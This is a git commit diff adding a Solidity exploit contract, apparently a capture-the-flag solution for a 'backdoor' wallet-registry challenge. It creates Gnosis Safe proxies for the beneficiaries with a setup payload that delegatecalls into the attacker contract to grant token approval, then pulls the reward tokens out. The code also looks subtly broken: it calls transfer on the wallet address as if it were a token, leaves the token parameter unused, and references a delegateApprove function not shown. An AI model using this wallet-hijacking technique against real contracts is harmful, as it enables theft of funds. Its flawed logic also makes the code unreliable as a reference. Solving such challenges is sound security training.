8af63fbb7a8bc9e4a44d450e36de31ab4c1d0e97
Crys <mariano.christopher123@gmail.com>
2023-02-14 21:31:52 +0800

    updated level 11

--- contracts/backdoor/WalletRegistry.sol
+++ contracts/backdoor/WalletRegistry.sol
@@ -110,10 +110,47 @@ contract WalletRegistry is IProxyCreationCallback, Ownable {
     }
 }
 
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
+import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
+
 contract BackdoorHack {
     // run attack via constructor as initializer
-    constructor() {
+    constructor(
+        address _registryAddress,
+        address _masterCopyAddress,
+        GnosisSafeProxyFactory _walletFactory,
+        IERC20 _token,
+        address[] memory _beneficiaries
+    ) {
         // create wallet for each beneficiary here(for loop each wallet)
-        // wallet will receieve DVT via callback then transfer to msg.sender
+        for (uint256 i = 0; i < _beneficiaries.length; i++) {
+            address[] memory beneficiary = new address[](1);
+            beneficiary[0] = _beneficiaries[i];
+
+            bytes memory _initializer = abi.encodeWithSelector(
+                GnosisSafe.setup.selector, // Selector for the setup() function call
+                beneficiary, // _owners =>  List of Safe owners.
+                1, // _threshold =>  Number of required confirmations for a Safe transaction.
+                address(this), //  to => Contract address for optional delegate call.
+                abi.encodeWithSignature(
+                    "delegateApprove(address)",
+                    address(this)
+                ), // data =>  Data payload for optional delegate call.
+                address(0), //  fallbackHandler =>  Handler for fallback calls to this contract
+                0, //  paymentToken =>  Token that should be used for the payment (0 is ETH)
+                0, // payment => Value that should be paid
+                0 //  paymentReceiver => Adddress that should receive the payment (or 0 if tx.origin)
+            );
+
+            GnosisSafeProxy wallet = _walletFactory.createProxyWithCallback(
+                _masterCopyAddress, // Singleton, the Gnosis master copy
+                _initializer, // initializer => Payload for message call sent to new proxy contract.
+                i, // saltNonce => Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
+                IProxyCreationCallback(_registryAddress) //  callback => Function that will be called after the new proxy contract has been deployed and initialized.
+            );
+
+            // wallet will receieve DVT via callback then transfer to msg.sender
+            IERC20(address(wallet)).transfer(msg.sender, 10 ether);
+        }
     }
 }
